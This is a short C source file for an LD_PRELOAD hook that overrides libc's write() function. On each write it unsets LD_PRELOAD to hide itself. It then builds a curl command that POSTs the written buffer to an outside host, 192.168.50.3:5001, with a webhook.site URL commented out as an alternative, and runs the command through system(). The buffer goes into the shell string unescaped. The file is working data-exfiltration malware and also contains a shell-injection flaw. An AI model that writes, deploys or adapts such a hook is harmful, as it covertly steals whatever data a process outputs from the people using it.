#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
// note this can be re-written to use libcurl

ssize_t write(int fd, const void *buf, size_t count) {

  // cast our buffer so we can read it
  char *p = (char *)buf;

  // unset the ld_prload env
  int ret = unsetenv("LD_PRELOAD");
  
  //format our string to make the curl call
  char testData[50000];
  strcpy(testData, "curl -s --output /dev/null -d 'data=");
  strcat(testData, p);
  //strcat(testData, "' -X POST 'https://webhook.site/65277f4e-f566-41bc-89ba-00132e05f7b3'");
  strcat(testData, "' -X POST 'http://192.168.50.3:5001'");
  
  
  //make our curl call
  system(testData);
  
  // Look up the next write symbol
  ssize_t (*orig_write)(int fd, const void *buf, size_t count) = dlsym(RTLD_NEXT, "write");

  return orig_write(fd, buf, count);
}
